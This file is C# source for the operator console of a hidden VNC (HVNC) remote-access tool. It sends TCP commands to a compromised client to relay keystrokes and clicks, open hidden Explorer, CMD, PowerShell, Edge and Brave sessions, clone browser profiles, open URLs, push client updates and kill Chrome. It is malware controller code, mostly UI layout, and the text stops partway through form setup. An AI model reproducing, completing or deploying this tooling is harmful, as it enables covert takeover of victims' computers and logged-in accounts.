

using Microsoft.VisualBasic.CompilerServices;
using Siticone.Desktop.UI.WinForms;
using Siticone.Desktop.UI.WinForms.Enums;
using Siticone.Desktop.UI.WinForms.Interfaces;
using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Windows.Forms;

namespace HVNC
{
  public class FrmVNC : Form
  {
    private TcpClient tcpClient_0;
    private int int_0;
    private bool bool_1;
    private bool bool_2;
    public FrmTransfer FrmTransfer0;
    private IContainer components;
    private Panel panel1;
    private Timer timer2;
    private ToolStripStatusLabel toolStripStatusLabel2;
    private ToolStripStatusLabel toolStripStatusLabel1;
    private Timer timer1;
    private PictureBox VNCBox;
    private PictureBox pictureBox1;
    private ToolStripSeparator toolStripSeparator1;
    private Label chkClone1;
    private Label QualityLabel;
    private Label label2;
    private Label label3;
    private Label ledstatus;
    private SiticoneGradientPanel siticoneGradientPanel4;
    private SiticoneToggleSwitch ToggleHVNC;
    private SiticoneGradientPanel siticoneGradientPanel1;
    private Label toolStripStatusLabel3;
    private SiticoneGradientPanel siticoneGradientPanel2;
    public SiticoneGradientButton test2ToolStripMenuItem;
    public SiticoneGradientButton CloseBtn;
    public SiticoneGradientButton braveToolStripMenuItem;
    public SiticoneGradientButton powershellToolStripMenuItem;
    public SiticoneGradientButton test1ToolStripMenuItem;
    public SiticoneGradientButton edgeToolStripMenuItem;
    public SiticoneGradientButton fileExplorerToolStripMenuItem;
    private Label IntervalLabel;
    private SiticoneBorderlessForm siticoneBorderlessForm1;
    private SiticoneDragControl siticoneDragControl1;
    private SiticoneToggleSwitch chkClone;
    private SiticoneTrackBar QualityScroll;
    private SiticoneTrackBar ResizeScroll;
    private SiticoneResizeBox siticoneResizeBox1;
    private SiticoneTrackBar IntervalScroll;
    private SiticoneControlBox siticoneControlBox3;
    private SiticoneControlBox siticoneControlBox2;
    private SiticoneControlBox siticoneControlBox1;
    private SiticoneCirclePictureBox statusled;

    public PictureBox VNCBoxe
    {
      get => this.VNCBox;
      set => this.VNCBox = value;
    }

    public ToolStripStatusLabel toolStripStatusLabel2_
    {
      get => this.toolStripStatusLabel2;
      set => this.toolStripStatusLabel2 = value;
    }

    public FrmVNC()
    {
      this.int_0 = 0;
      this.bool_1 = true;
      this.bool_2 = false;
      this.FrmTransfer0 = new FrmTransfer();
      this.InitializeComponent();
      this.VNCBox.MouseEnter += new EventHandler(this.VNCBox_MouseEnter);
      this.VNCBox.MouseLeave += new EventHandler(this.VNCBox_MouseLeave);
      this.VNCBox.KeyPress += new KeyPressEventHandler(this.VNCBox_KeyPress);
    }

    private void VNCBox_MouseEnter(object sender, EventArgs e) => this.VNCBox.Focus();

    private void VNCBox_MouseLeave(object sender, EventArgs e)
    {
      this.FindForm().ActiveControl = (Control) null;
      this.ActiveControl = (Control) null;
    }

    private void VNCBox_KeyPress(object sender, KeyPressEventArgs e) => this.SendTCP((object) ("7*" + Conversions.ToString(e.KeyChar)), this.tcpClient_0);

    private void VNCForm_Load(object sender, EventArgs e)
    {
      if (this.FrmTransfer0.IsDisposed)
        this.FrmTransfer0 = new FrmTransfer();
      this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(this.Tag);
      this.tcpClient_0 = (TcpClient) this.Tag;
      this.VNCBox.Tag = (object) new Size(1028, 1028);
    }

    public void Check()
    {
      try
      {
        if (this.FrmTransfer0.FileTransferLabele.Text == null)
          this.toolStripStatusLabel3.Text = "Status";
        else
          this.toolStripStatusLabel3.Text = this.FrmTransfer0.FileTransferLabele.Text;
      }
      catch
      {
      }
    }

    private void timer1_Tick(object sender, EventArgs e)
    {
      checked { this.int_0 += 100; }
      if (this.int_0 < SystemInformation.DoubleClickTime)
        return;
      this.bool_1 = true;
      this.bool_2 = false;
      this.int_0 = 0;
    }

    private void CopyBtn_Click(object sender, EventArgs e) => this.SendTCP((object) "9*", this.tcpClient_0);

    private void PasteBtn_Click(object sender, EventArgs e)
    {
      try
      {
        this.SendTCP((object) ("10*" + Clipboard.GetText()), this.tcpClient_0);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void ShowStart_Click(object sender, EventArgs e) => this.SendTCP((object) "13*", this.tcpClient_0);

    private void VNCBox_MouseDown(object sender, MouseEventArgs e)
    {
      if (this.bool_1)
      {
        this.bool_1 = false;
        this.timer1.Start();
      }
      else if (this.int_0 < SystemInformation.DoubleClickTime)
        this.bool_2 = true;
      Point location = e.Location;
      object tag = this.VNCBox.Tag;
      Size size = tag != null ? (Size) tag : new Size();
      double num1 = (double) this.VNCBox.Width / (double) size.Width;
      double num2 = (double) this.VNCBox.Height / (double) size.Height;
      double num3 = Math.Ceiling((double) location.X / num1);
      double num4 = Math.Ceiling((double) location.Y / num2);
      if (this.bool_2)
      {
        if (e.Button != MouseButtons.Left)
          return;
        this.SendTCP((object) ("6*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4)), this.tcpClient_0);
      }
      else if (e.Button == MouseButtons.Left)
      {
        this.SendTCP((object) ("2*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4)), this.tcpClient_0);
      }
      else
      {
        if (e.Button != MouseButtons.Right)
          return;
        this.SendTCP((object) ("3*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4)), this.tcpClient_0);
      }
    }

    private void VNCBox_MouseUp(object sender, MouseEventArgs e)
    {
      Point location = e.Location;
      object tag = this.VNCBox.Tag;
      Size size = tag != null ? (Size) tag : new Size();
      double num1 = (double) this.VNCBox.Width / (double) size.Width;
      double num2 = (double) this.VNCBox.Height / (double) size.Height;
      double num3 = Math.Ceiling((double) location.X / num1);
      double num4 = Math.Ceiling((double) location.Y / num2);
      if (e.Button == MouseButtons.Left)
      {
        this.SendTCP((object) ("4*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4)), this.tcpClient_0);
      }
      else
      {
        if (e.Button != MouseButtons.Right)
          return;
        this.SendTCP((object) ("5*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4)), this.tcpClient_0);
      }
    }

    private void VNCBox_MouseMove(object sender, MouseEventArgs e)
    {
      Point location = e.Location;
      object tag = this.VNCBox.Tag;
      Size size = tag != null ? (Size) tag : new Size();
      double num1 = (double) this.VNCBox.Width / (double) size.Width;
      double num2 = (double) this.VNCBox.Height / (double) size.Height;
      double num3 = Math.Ceiling((double) location.X / num1);
      double num4 = Math.Ceiling((double) location.Y / num2);
      this.SendTCP((object) ("8*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4)), this.tcpClient_0);
    }

    private void IntervalScroll_Scroll(object sender, EventArgs e)
    {
      this.IntervalLabel.Text = "Interval (ms): " + Conversions.ToString(this.IntervalScroll.Value);
      this.SendTCP((object) ("17*" + Conversions.ToString(this.IntervalScroll.Value)), this.tcpClient_0);
    }

    private void QualityScroll_Scroll(object sender, EventArgs e)
    {
      this.QualityLabel.Text = "Quality : " + Conversions.ToString(this.QualityScroll.Value) + "%";
      this.SendTCP((object) ("18*" + Conversions.ToString(this.QualityScroll.Value)), this.tcpClient_0);
    }

    private void ResizeScroll_Scroll(object sender, EventArgs e)
    {
      this.chkClone1.Text = "Resize : " + Conversions.ToString(this.ResizeScroll.Value) + "%";
      this.SendTCP((object) ("19*" + Conversions.ToString((double) this.ResizeScroll.Value / 100.0)), this.tcpClient_0);
    }

    private void RestoreMaxBtn_Click(object sender, EventArgs e) => this.SendTCP((object) "15*", this.tcpClient_0);

    private void MinBtn_Click(object sender, EventArgs e) => this.SendTCP((object) "14*", this.tcpClient_0);

    private void CloseBtn_Click(object sender, EventArgs e) => this.SendTCP((object) "16*", this.tcpClient_0);

    private void StartExplorer_Click(object sender, EventArgs e) => this.SendTCP((object) "21*", this.tcpClient_0);

    private void SendTCP(object object_0, TcpClient tcpClient_1)
    {
      try
      {
        lock (tcpClient_1)
        {
          BinaryFormatter binaryFormatter = new BinaryFormatter();
          binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
          binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
          binaryFormatter.FilterLevel = TypeFilterLevel.Full;
          object objectValue = RuntimeHelpers.GetObjectValue(object_0);
          MemoryStream serializationStream = new MemoryStream();
          binaryFormatter.Serialize((Stream) serializationStream, RuntimeHelpers.GetObjectValue(objectValue));
          ulong position = checked ((ulong) serializationStream.Position);
          tcpClient_1.GetStream().Write(BitConverter.GetBytes(position), 0, 8);
          byte[] buffer = serializationStream.GetBuffer();
          tcpClient_1.GetStream().Write(buffer, 0, checked ((int) position));
          serializationStream.Close();
          serializationStream.Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void VNCForm_KeyPress(object sender, KeyPressEventArgs e) => this.SendTCP((object) ("7*" + Conversions.ToString(e.KeyChar)), this.tcpClient_0);

    private void VNCForm_FormClosing(object sender, FormClosingEventArgs e)
    {
      this.SendTCP((object) "1*", this.tcpClient_0);
      this.VNCBox.Image = (Image) null;
      GC.Collect();
      this.Dispose();
      this.Close();
      e.Cancel = true;
    }

    private void VNCForm_Click(object sender, EventArgs e) => this.method_18((object) null);

    private void method_18(object object_0) => this.ActiveControl = (Control) object_0;

    private void button1_Click(object sender, EventArgs e)
    {
      if (this.chkClone.Checked)
      {
        if (this.FrmTransfer0.IsDisposed)
          this.FrmTransfer0 = new FrmTransfer();
        this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(this.Tag);
        this.FrmTransfer0.Hide();
        this.SendTCP((object) ("30*" + Conversions.ToString(true)), (TcpClient) this.Tag);
      }
      else
        this.SendTCP((object) ("30*" + Conversions.ToString(false)), (TcpClient) this.Tag);
    }

    private void timer2_Tick(object sender, EventArgs e) => this.Check();

    private void closeToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (MessageBox.Show("Are you sure ? " + Environment.NewLine + Environment.NewLine + "You lose the connection !", "Close Connection ?", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) != DialogResult.Yes)
        return;
      this.SendTCP((object) "24*", this.tcpClient_0);
      this.Close();
    }

    private void button6_Click(object sender, EventArgs e)
    {
    }

    private void button7_Click(object sender, EventArgs e) => this.SendTCP((object) "4875*", this.tcpClient_0);

    private void button8_Click(object sender, EventArgs e) => this.SendTCP((object) "4876*", this.tcpClient_0);

    private void IntervalScroll_Scroll(object sender, ScrollEventArgs e)
    {
      this.IntervalLabel.Text = "Interval (ms): " + Conversions.ToString(this.IntervalScroll.Value);
      this.SendTCP((object) ("17*" + Conversions.ToString(this.IntervalScroll.Value)), this.tcpClient_0);
    }

    private void ResizeScroll_Scroll(object sender, ScrollEventArgs e)
    {
      this.chkClone1.Text = "Resize : " + Conversions.ToString(this.ResizeScroll.Value) + "%";
      this.SendTCP((object) ("19*" + Conversions.ToString((double) this.ResizeScroll.Value / 100.0)), this.tcpClient_0);
    }

    private void QualityScroll_Scroll(object sender, ScrollEventArgs e)
    {
      this.QualityLabel.Text = "HQ : " + Conversions.ToString(this.QualityScroll.Value) + "%";
      this.SendTCP((object) ("18*" + Conversions.ToString(this.QualityScroll.Value)), this.tcpClient_0);
    }

    private void guna2Button2_Click(object sender, EventArgs e)
    {
      if (MessageBox.Show("Are you sure ? " + Environment.NewLine + Environment.NewLine + "You lose the connection !", "Close Connexion ?", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) != DialogResult.Yes)
        return;
      this.SendTCP((object) "24*", this.tcpClient_0);
      this.Close();
    }

    private void VNCBox_MouseHover(object sender, EventArgs e) => this.VNCBox.Focus();

    private void guna2Button3_Click(object sender, EventArgs e)
    {
      if (MessageBox.Show("Are you sure ? " + Environment.NewLine + Environment.NewLine + "You lose the connection !", "Close Connection ?", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) != DialogResult.Yes)
        return;
      this.Close();
    }

    private void fileExplorerToolStripMenuItem_Click(object sender, EventArgs e) => this.SendTCP((object) "21*", this.tcpClient_0);

    private void powershellToolStripMenuItem_Click(object sender, EventArgs e) => this.SendTCP((object) "4876*", this.tcpClient_0);

    private void cMDToolStripMenuItem_Click(object sender, EventArgs e) => this.SendTCP((object) "4875*", this.tcpClient_0);

    private void windowsToolStripMenuItem_Click(object sender, EventArgs e) => this.SendTCP((object) "13*", this.tcpClient_0);

    private void test1ToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.chkClone.Checked)
      {
        if (this.FrmTransfer0.IsDisposed)
          this.FrmTransfer0 = new FrmTransfer();
        this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(this.Tag);
        this.FrmTransfer0.Hide();
        this.SendTCP((object) ("11*" + Conversions.ToString(true)), (TcpClient) this.Tag);
      }
      else
        this.SendTCP((object) ("11*" + Conversions.ToString(false)), (TcpClient) this.Tag);
    }

    private void test2ToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.chkClone.Checked)
      {
        if (this.FrmTransfer0.IsDisposed)
          this.FrmTransfer0 = new FrmTransfer();
        this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(this.Tag);
        this.FrmTransfer0.Hide();
        this.SendTCP((object) ("12*" + Conversions.ToString(true)), (TcpClient) this.Tag);
      }
      else
        this.SendTCP((object) ("12*" + Conversions.ToString(false)), (TcpClient) this.Tag);
    }

    private void braveToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.chkClone.Checked)
      {
        if (this.FrmTransfer0.IsDisposed)
          this.FrmTransfer0 = new FrmTransfer();
        this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(this.Tag);
        this.FrmTransfer0.Hide();
        this.SendTCP((object) ("32*" + Conversions.ToString(true)), (TcpClient) this.Tag);
      }
      else
        this.SendTCP((object) ("32*" + Conversions.ToString(false)), (TcpClient) this.Tag);
    }

    private void edgeToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.chkClone.Checked)
      {
        if (this.FrmTransfer0.IsDisposed)
          this.FrmTransfer0 = new FrmTransfer();
        this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(this.Tag);
        this.FrmTransfer0.Hide();
        this.SendTCP((object) ("30*" + Conversions.ToString(true)), (TcpClient) this.Tag);
      }
      else
        this.SendTCP((object) ("30*" + Conversions.ToString(false)), (TcpClient) this.Tag);
    }

    public void hURL(string url) => this.SendTCP((object) ("8585* " + url), (TcpClient) this.Tag);

    public void UpdateClient(string url) => this.SendTCP((object) ("8589* " + url), (TcpClient) this.Tag);

    public void CloseClient() => this.SendTCP((object) "24*", (TcpClient) this.Tag);

    public void ResetScale() => this.SendTCP((object) "8587*", (TcpClient) this.Tag);

    public void KillChrome() => this.SendTCP((object) "8586*", (TcpClient) this.Tag);

    private void exportbtn_Click(object sender, EventArgs e)
    {
    }

    private void copyToolStripMenuItem_Click(object sender, EventArgs e) => this.SendTCP((object) "3307*", this.tcpClient_0);

    private void pasteToolStripMenuItem_Click(object sender, EventArgs e) => this.SendTCP((object) ("3306*" + Clipboard.GetText()), (TcpClient) this.Tag);

    private void ToggleHVNC_CheckedChanged(object sender, EventArgs e)
    {
      if (this.ToggleHVNC.Checked)
      {
        this.SendTCP((object) "0*", this.tcpClient_0);
        this.FrmTransfer0.FileTransferLabele.Text = "HVNC Started!";
      }
      else
      {
        if (this.ToggleHVNC.Checked)
          return;
        this.SendTCP((object) "1*", this.tcpClient_0);
        this.VNCBox.Image = (Image) null;
        this.FrmTransfer0.FileTransferLabele.Text = "HVNC Stopped!";
        GC.Collect();
      }
    }

    public static string labelstatus { get; set; }

    private void toolStripStatusLabel3_TextChanged(object sender, EventArgs e)
    {
      FrmVNC.labelstatus = this.FrmTransfer0.FileTransferLabele.Text;
      if (FrmVNC.labelstatus == "Idle")
        this.statusled.FillColor = Color.White;
      else if (FrmVNC.labelstatus.Contains("MB"))
      {
        this.ledstatus.Text = "Cloning Profile...";
        this.statusled.FillColor = Color.Yellow;
      }
      else
      {
        if (!FrmVNC.labelstatus.Contains("initiated"))
          return;
        this.ledstatus.Text = "Profile Cloned";
        this.statusled.FillColor = Color.FromArgb(4, 143, 110);
      }
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (FrmVNC));
      this.panel1 = new Panel();
      this.siticoneControlBox3 = new SiticoneControlBox();
      this.siticoneControlBox2 = new SiticoneControlBox();
      this.siticoneControlBox1 = new SiticoneControlBox();
      this.label2 = new Label();
      this.pictureBox1 = new PictureBox();
      this.timer2 = new Timer(this.components);
      this.toolStripStatusLabel2 = new ToolStripStatusLabel();
      this.toolStripStatusLabel1 = new ToolStripStatusLabel();
      this.timer1 = new Timer(this.components);
      this.ledstatus = new Label();
      this.label3 = new Label();
      this.chkClone1 = new Label();
      this.QualityLabel = new Label();
      this.VNCBox = new PictureBox();
      this.toolStripSeparator1 = new ToolStripSeparator();
      this.siticoneGradientPanel4 = new SiticoneGradientPanel();
      this.statusled = new SiticoneCirclePictureBox();
      this.QualityScroll = new SiticoneTrackBar();
      this.ResizeScroll = new SiticoneTrackBar();
      this.chkClone = new SiticoneToggleSwitch();
      this.ToggleHVNC = new SiticoneToggleSwitch();
      this.siticoneGradientPanel1 = new SiticoneGradientPanel();
      this.siticoneResizeBox1 = new SiticoneResizeBox();
      this.toolStripStatusLabel3 = new Label();
      this.siticoneGradientPanel2 = new SiticoneGradientPanel();
      this.test2ToolStripMenuItem = new SiticoneGradientButton();
      this.CloseBtn = new SiticoneGradientButton();
      this.braveToolStripMenuItem = new SiticoneGradientButton();
      this.powershellToolStripMenuItem = new SiticoneGradientButton();
      this.test1ToolStripMenuItem = new SiticoneGradientButton();
      this.edgeToolStripMenuItem = new SiticoneGradientButton();
      this.fileExplorerToolStripMenuItem = new SiticoneGradientButton();
      this.IntervalLabel = new Label();
      this.siticoneBorderlessForm1 = new SiticoneBorderlessForm(this.components);
      this.siticoneDragControl1 = new SiticoneDragControl(this.components);
      this.IntervalScroll = new SiticoneTrackBar();
      this.panel1.SuspendLayout();
      ((ISupportInitialize) this.pictureBox1).BeginInit();
      ((ISupportInitialize) this.VNCBox).BeginInit();
      this.siticoneGradientPanel4.SuspendLayout();
      ((ISupportInitialize) this.statusled).BeginInit();
      this.siticoneGradientPanel1.SuspendLayout();
      this.siticoneGradientPanel2.SuspendLayout();
      this.SuspendLayout();
      this.panel1.BackColor = Color.FromArgb(27, 27, 27);
      this.panel1.Controls.Add((Control) this.siticoneControlBox3);
      this.panel1.Controls.Add((Control) this.siticoneControlBox2);
      this.panel1.Controls.Add((Control) this.siticoneControlBox1);
      this.panel1.Controls.Add((Control) this.label2);
      this.panel1.Controls.Add((Control) this.pictureBox1);
      this.panel1.Dock = DockStyle.Top;
      this.panel1.Location = new Point(0, 0);
      this.panel1.Name = "panel1";
      this.panel1.Size = new Size(1261, 37);
      this.panel1.TabIndex = 32;
      this.siticoneControlBox3.Anchor = AnchorStyles.Top | AnchorStyles.Right;
      this.siticoneControlBox3.FillColor = Color.Transparent;
      this.siticoneControlBox3.HoverState.Parent = this.siticoneControlBox3;
      this.siticoneControlBox3.IconColor = Color.White;
      this.siticoneControlBox3.Location = new Point(1228, 3);
      this.siticoneControlBox3.Name = "siticoneControlBox3";
      this.siticoneControlBox3.ShadowDecoration.Parent = (Control) this.siticoneControlBox3;
      this.siticoneControlBox3.Size = new Size(30, 30);
      this.siticoneControlBox3.TabIndex = 148;
      this.siticoneControlBox2.Anchor = AnchorStyles.Top | AnchorStyles.Right;
      this.siticoneControlBox2.ControlBoxType = ControlBoxType.MaximizeBox;
      this.siticoneControlBox2.FillColor = Color.Transparent;
      this.siticoneControlBox2.HoverState.Parent = this.siticoneControlBox2;
      this.siticoneControlBox2.IconColor = Color.White;
      this.siticoneControlBox2.Location = new Point(1192, 3);
      this.siticoneControlBox2.Name = "siticoneControlBox2";
      this.siticoneControlBox2.ShadowDecoration.Parent = (Control) this.siticoneControlBox2;
      this.siticoneControlBox2.Size = new Size(30, 30);
      this.siticoneControlBox2.TabIndex = 148;
      this.siticoneControlBox1.Anchor = AnchorStyles.Top | AnchorStyles.Right;
      this.siticoneControlBox1.ControlBoxType = ControlBoxType.MinimizeBox;
      this.siticoneControlBox1.FillColor = Color.Transparent;
      this.siticoneControlBox1.HoverState.Parent = this.siticoneControlBox1;
      this.siticoneControlBox1.IconColor = Color.White;
      this.siticoneControlBox1.Location = new Point(1156, 3);
      this.siticoneControlBox1.Name = "siticoneControlBox1";
      this.siticoneControlBox1.ShadowDecoration.Parent = (Control) this.siticoneControlBox1;
      this.siticoneControlBox1.Size = new Size(30, 30);
      this.siticoneControlBox1.TabIndex = 148;
      this.label2.AutoSize = true;
      this.label2.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label2.ForeColor = Color.Gainsboro;
      this.label2.Location = new Point(36, 6);
      this.label2.Name = "label2";
      this.label2.Size = new Size(109, 20);
      this.label2.TabIndex = 147;
      this.label2.Text = "HVNC";
      this.pictureBox1.Image = (Image) componentResourceManager.GetObject("pictureBox1.Image");
      this.pictureBox1.Location = new Point(0, 0);
      this.pictureBox1.Name = "pictureBox1";
      this.pictureBox1.Size = new Size(30, 30);
      this.pictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
      this.pictureBox1.TabIndex = 145;
      this.pictureBox1.TabStop = false;
      this.timer2.Enabled = true;
      this.timer2.Interval = 1000;
      this.timer2.Tick += new EventHandler(this.timer2_Tick);
      this.toolStripStatusLabel2.Name = "toolStripStatusLabel2";
      this.toolStripStatusLabel2.Size = new Size(26, 17);
      this.toolStripStatusLabel2.Text = "Idle";
      this.toolStripStatusLabel1.Name = "toolStripStatusLabel1";
      this.toolStripStatusLabel1.Size = new Size(44, 17);
      this.toolStripStatusLabel1.Text = "Statut :";
      this.timer1.Tick += new EventHandler(this.timer1_Tick);
      this.ledstatus.Anchor = AnchorStyles.Top;
      this.ledstatus.AutoSize = true;
      this.ledstatus.BackColor = Color.Transparent;
      this.ledstatus.ForeColor = Color.Gainsboro;
      this.ledstatus.Location = new Point(509, 12);
      this.ledstatus.Name = "ledstatus";
      this.ledstatus.Size = new Size(27, 13);
      this.ledstatus.TabIndex = 150;
      this.ledstatus.Text = "N/A";
      this.label3.Anchor = AnchorStyles.Top;
      this.label3.AutoSize = true;
      this.label3.BackColor = Color.Transparent;
      this.label3.ForeColor = Color.Gainsboro;
      this.label3.Location = new Point(551, 12);
      this.label3.Name = "label3";
      this.label3.Size = new Size(77, 13);
      this.label3.TabIndex = 150;
      this.label3.Text = "Clone Account";
      this.chkClone1.Anchor = AnchorStyles.Top;
      this.chkClone1.AutoSize = true;
      this.chkClone1.BackColor = Color.Transparent;
      this.chkClone1.ForeColor = Color.Gainsboro;
      this.chkClone1.Location = new Point(1000, 12);
      this.chkClone1.Name = "chkClone1";
      this.chkClone1.Size = new Size(68, 13);
      this.chkClone1.TabIndex = 4;
      this.chkClone1.Text = "Resize : 50%";
      this.QualityLabel.Anchor = AnchorStyles.Top;
      this.QualityLabel.AutoSize = true;
      this.QualityLabel.BackColor = Color.Transparent;
      this.QualityLabel.ForeColor = Color.Gainsboro;
      this.QualityLabel.Location = new Point(795, 12);
      this.QualityLabel.Name = "QualityLabel";
      this.QualityLabel.Size = new Size(52, 13);
      this.QualityLabel.TabIndex = 5;
      this.QualityLabel.Text = "HQ : 50%";
      this.VNCBox.BackColor = Color.FromArgb(27, 27, 27);
      this.VNCBox.Dock = DockStyle.Fill;
      this.VNCBox.ErrorImage = (Image) null;
      this.VNCBox.InitialImage = (Image) null;
      this.VNCBox.Location = new Point(0, 71);
      this.VNCBox.Name = "VNCBox";
      this.VNCBox.Size = new Size(1261, 643);
      this.VNCBox.SizeMode = PictureBoxSizeMode.StretchImage;
      this.VNCBox.TabIndex = 40;
      this.VNCBox.TabStop = false;
      this.VNCBox.MouseDown += new MouseEventHandler(this.VNCBox_MouseDown);
      this.VNCBox.MouseEnter += new EventHandler(this.VNCBox_MouseEnter);
      this.VNCBox.MouseLeave += new EventHandler(this.VNCBox_MouseLeave);
      this.VNCBox.MouseHover += new EventHandler(this.VNCBox_MouseHover);
      this.VNCBox.MouseMove += new MouseEventHandler(this.VNCBox_MouseMove);
      this.VNCBox.MouseUp += new MouseEventHandler(this.VNCBox_MouseUp);
      this.toolStripSeparator1.Name = "toolStripSeparator1";
      this.toolStripSeparator1.Size = new Size(244, 6);
      this.siticoneGradientPanel4.BackColor = Color.FromArgb(27, 27, 27);
      this.siticoneGradientPanel4.Controls.Add((Control) this.statusled);
      this.siticoneGradientPanel4.Controls.Add((Control) this.QualityScroll);
      this.siticoneGradientPanel4.Controls.Add((Control) this.ResizeScroll);
      this.siticoneGradientPanel4.Controls.Add((Control) this.chkClone);
      this.siticoneGradientPanel4.Controls.Add((Control) this.ToggleHVNC);
      this.siticoneGradientPanel4.Controls.Add((Control) this.ledstatus);
      this.siticoneGradientPanel4.Controls.Add((Control) this.label3);
      this.siticoneGradientPanel4.Controls.Add((Control) this.chkClone1);
      this.siticoneGradientPanel4.Controls.Add((Control) this.QualityLabel);
      this.siticoneGradientPanel4.Dock = DockStyle.Top;
      this.siticoneGradientPanel4.FillColor = Color.FromArgb(92 ,36 , 28);
      this.siticoneGradientPanel4.FillColor2 = Color.FromArgb(27, 27, 27);
      this.siticoneGradientPanel4.Location = new Point(0, 37);
      this.siticoneGradientPanel4.Name = "siticoneGradientPanel4";
      this.siticoneGradientPanel4.ShadowDecoration.Parent = (Control) this.siticoneGradientPanel4;
      this.siticoneGradientPanel4.Size = new Size(1261, 34);
      this.siticoneGradientPanel4.TabIndex = 124;
      this.statusled.Anchor = AnchorStyles.Top;
      this.statusled.BackColor = Color.Transparent;
      this.statusled.ErrorImage = (Image) null;
      this.statusled.ImageRotate = 0.0f;
      this.statusled.Location = new Point(485, 8);
      this.statusled.Name = "statusled";
      this.statusled.ShadowDecoration.Mode = Siticone.Desktop.UI.WinForms.Enums.ShadowMode.Circle;
      this.statusled.ShadowDecoration.Parent = (Control) this.statusled;
      this.statusled.Size = new Size(20, 20);
      this.statusled.TabIndex = 153;
      this.statusled.TabStop = false;
      this.QualityScroll.Anchor = AnchorStyles.Top;
      this.QualityScroll.BackColor = Color.Transparent;
      this.QualityScroll.FillColor = Color.FromArgb(4, 143, 110);
      this.QualityScroll.HoverState.Parent = this.QualityScroll;
      this.QualityScroll.Location = new Point(853, 7);
      this.QualityScroll.Name = "QualityScroll";
      this.QualityScroll.Size = new Size(111, 23);
      this.QualityScroll.Style = TrackBarStyle.Metro;
      this.QualityScroll.TabIndex = 152;
      this.QualityScroll.ThumbColor = Color.FromArgb(8, 104, 81);
      this.QualityScroll.Scroll += new ScrollEventHandler(this.QualityScroll_Scroll);
      this.ResizeScroll.Anchor = AnchorStyles.Top;
      this.ResizeScroll.BackColor = Color.Transparent;
      this.ResizeScroll.FillColor = Color.FromArgb(4, 143, 110);
      this.ResizeScroll.HoverState.Parent = this.ResizeScroll;
      this.ResizeScroll.Location = new Point(1076, 6);
      this.ResizeScroll.Name = "ResizeScroll";
      this.ResizeScroll.Size = new Size(111, 23);
      this.ResizeScroll.Style = TrackBarStyle.Metro;
      this.ResizeScroll.TabIndex = 152;
      this.ResizeScroll.ThumbColor = Color.FromArgb(8, 104, 81);
      this.ResizeScroll.Scroll += new ScrollEventHandler(this.ResizeScroll_Scroll);
      this.chkClone.Anchor = AnchorStyles.Top;
      this.chkClone.BackColor = Color.Transparent;
      this.chkClone.CheckedState.BorderColor = Color.Transparent;
      this.chkClone.CheckedState.FillColor = Color.Transparent;
      this.chkClone.CheckedState.InnerBorderColor = Color.White;
      this.chkClone.CheckedState.InnerBorderThickness = 2;
      this.chkClone.CheckedState.InnerColor = Color.FromArgb(243, 30, 30);
      this.chkClone.CheckedState.Parent = this.chkClone;
      this.chkClone.Location = new Point(634, 8);
      this.chkClone.Name = "chkClone";
      this.chkClone.ShadowDecoration.Parent = (Control) this.chkClone;
      this.chkClone.Size = new Size(39, 20);
      this.chkClone.TabIndex = 150;
      this.chkClone.UncheckedState.BorderColor = Color.Transparent;
      this.chkClone.UncheckedState.FillColor = Color.Transparent;
      this.chkClone.UncheckedState.InnerBorderColor = Color.White;
      this.chkClone.UncheckedState.InnerColor = Color.FromArgb(243, 30, 30);
      this.chkClone.UncheckedState.Parent = this.chkClone;
      this.ToggleHVNC.BackColor = Color.Transparent;
      this.ToggleHVNC.CheckedState.BorderColor = Color.Transparent;
      this.ToggleHVNC.CheckedState.FillColor = Color.Transparent;
      this.ToggleHVNC.CheckedState.InnerBorderColor = Color.White;
      this.ToggleHVNC.CheckedState.InnerBorderThickness = 2;
      this.ToggleHVNC.CheckedState.InnerColor = Color.FromArgb(243, 30, 30);
      this.ToggleHVNC.CheckedState.Parent = this.ToggleHVNC;
      this.ToggleHVNC.Location = new Point(40, 8);
      this.ToggleHVNC.Name = "ToggleHVNC";
      this.ToggleHVNC.ShadowDecoration.Parent = (Control) this.ToggleHVNC;
      this.ToggleHVNC.Size = new Size(39, 20);
      this.ToggleHVNC.TabIndex = 150;
      this.ToggleHVNC.UncheckedState.BorderColor = Color.Transparent;
      this.ToggleHVNC.UncheckedState.FillColor = Color.Transparent;
      this.ToggleHVNC.UncheckedState.InnerBorderColor = Color.White;
      this.ToggleHVNC.UncheckedState.InnerColor = Color.FromArgb(243, 30, 30);
